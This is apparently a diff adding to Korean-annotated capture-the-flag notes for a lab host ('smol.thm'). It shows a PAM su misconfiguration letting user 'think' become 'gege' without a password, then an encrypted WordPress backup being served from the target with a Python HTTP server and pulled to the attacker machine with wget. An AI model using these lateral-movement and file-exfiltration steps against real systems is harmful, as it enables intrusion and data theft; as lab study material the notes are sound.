@@ -1054,8 +1054,93 @@ think@ip-10-10-97-230:~$ pwd
 /home/think
 think@ip-10-10-97-230:~$
 
-# gege
+# gege -> 그냥 전환이 되네? -> misconfiguration
+
+cat /etc/pam.d/su
 
 think@ip-10-10-97-230:/home/gege$ ls
 wordpress.old.zip
 think@ip-10-10-97-230:/home/gege$
+
+```bash
+think@ip-10-10-97-230:/home/gege$ cat /etc/pam.d/su
+#
+# The PAM configuration file for the Shadow `su' service
+#
+
+# This allows root to su without passwords (normal operation)
+auth       sufficient pam_rootok.so
+auth  [success=ignore default=1] pam_succeed_if.so user = gege
+auth  sufficient                 pam_succeed_if.so use_uid user = think
+# Uncomment this to force users to be a member of group root
+# before they can use `su'. You can also add "group=foo"
+# to the end of this line if you want to use a group other
+# than the default "root" (but this may have side effect of
+# denying "root" user, unless she's a member of "foo" or explicitly
+# permitted earlier by e.g. "sufficient pam_rootok.so").
+# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
+# auth       required   pam_wheel.so
+
+# Uncomment this if you want wheel members to be able to
+# su without a password.
+# auth       sufficient pam_wheel.so trust
+
+# Uncomment this if you want members of a specific group to not
+# be allowed to use su at all.
+# auth       required   pam_wheel.so deny group=nosu
+
+# Uncomment and edit /etc/security/time.conf if you need to set
+# time restrainst on su usage.
+# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
+# as well as /etc/porttime)
+# account    requisite  pam_time.so
+
+# This module parses environment configuration file(s)
+# and also allows you to use an extended config
+# file /etc/security/pam_env.conf.
+#
+# parsing /etc/environment needs "readenv=1"
+session       required   pam_env.so readenv=1
+# locale variables are also kept into /etc/default/locale in etch
+# reading this file *in addition to /etc/environment* does not hurt
+session       required   pam_env.so readenv=1 envfile=/etc/default/locale
+
+# Defines the MAIL environment variable
+# However, userdel also needs MAIL_DIR and MAIL_FILE variables
+# in /etc/login.defs to make sure that removing a user
+# also removes the user's mail spool file.
+# See comments in /etc/login.defs
+#
+# "nopen" stands to avoid reporting new mail when su'ing to another user
+session    optional   pam_mail.so nopen
+
+# Sets up user limits according to /etc/security/limits.conf
+# (Replaces the use of /etc/limits in old login)
+session    required   pam_limits.so
+
+# The standard Unix authentication modules, used with
+# NIS (man nsswitch) as well as normal /etc/passwd and
+# /etc/shadow entries.
+@include common-auth
+@include common-account
+@include common-session
+
+
+think@ip-10-10-97-230:/home/gege$
+```
+
+# unzip wordpress.old.zip -> 암호화 걸림 -> 다운로드 필요
+
+wordpress.old wordpress.old.zip
+gege@ip-10-10-97-230:~$ unzip wordpress.old.zip
+Archive: wordpress.old.zip
+[wordpress.old.zip] wordpress.old/wp-config.php password:
+
+# python3 -m http.server 8080 -> in target
+
+[wordpress.old.zip] wordpress.old/wp-config.php password: gege@ip-10-10-97-230:~$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+# attacker -> 공격자에서 요청 설치 -> 서버를 오픈했던 path 를 기반으로 설치할 파일 요청
+
+wget http://www.smol.thm:8080/wordpress.old.zip
